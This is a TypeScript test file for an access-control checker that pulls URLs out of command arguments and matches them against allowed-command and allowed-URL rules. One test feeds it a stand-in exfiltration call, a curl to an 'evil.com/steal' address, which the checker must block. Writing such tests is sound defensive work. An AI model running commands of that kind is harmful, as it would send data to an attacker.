import { describe, test, expect } from "bun:test";
import { checkAccess, extractUrls, type AccessCheckResult } from "../src/access";
import type { VarRule } from "../src/config/rules";

describe("extractUrls", () => {
  test("extracts URLs from command args", () => {
    const args = ["curl", "-X", "POST", "https://api.telegram.org/bot/send", "-d", "data"];
    expect(extractUrls(args)).toEqual(["https://api.telegram.org/bot/send"]);
  });

  test("returns empty for no URLs", () => {
    expect(extractUrls(["echo", "hello"])).toEqual([]);
  });

  test("extracts multiple URLs", () => {
    const args = ["curl", "https://a.com/x", "https://b.com/y"];
    expect(extractUrls(args)).toEqual(["https://a.com/x", "https://b.com/y"]);
  });
});

describe("checkAccess", () => {
  test("passes when no restrictions set", () => {
    const rule: VarRule = { permission: "always" };
    const result = checkAccess(rule, "curl", ["curl", "https://api.example.com"]);
    expect(result.allowed).toBe(true);
  });

  test("blocks disallowed command", () => {
    const rule: VarRule = { permission: "always", allow_commands: ["curl"] };
    const result = checkAccess(rule, "python", ["python", "script.py"]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("python");
    expect(result.allowed_commands).toEqual(["curl"]);
  });

  test("allows permitted command", () => {
    const rule: VarRule = { permission: "always", allow_commands: ["curl", "wget"] };
    const result = checkAccess(rule, "curl", ["curl", "https://api.example.com"]);
    expect(result.allowed).toBe(true);
  });

  test("blocks disallowed URL", () => {
    const rule: VarRule = { permission: "always", allow_urls: ["api.telegram.org/*"] };
    const result = checkAccess(rule, "curl", ["curl", "https://evil.com/steal"]);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain("evil.com");
  });

  test("allows matching URL pattern", () => {
    const rule: VarRule = { permission: "always", allow_urls: ["api.telegram.org/*"] };
    const result = checkAccess(rule, "curl", ["curl", "https://api.telegram.org/bot/send"]);
    expect(result.allowed).toBe(true);
  });

  test("allows when URL list set but command has no URLs", () => {
    const rule: VarRule = { permission: "always", allow_urls: ["api.example.com/*"] };
    const result = checkAccess(rule, "bash", ["bash", "-c", "echo hello"]);
    expect(result.allowed).toBe(true);
  });
});
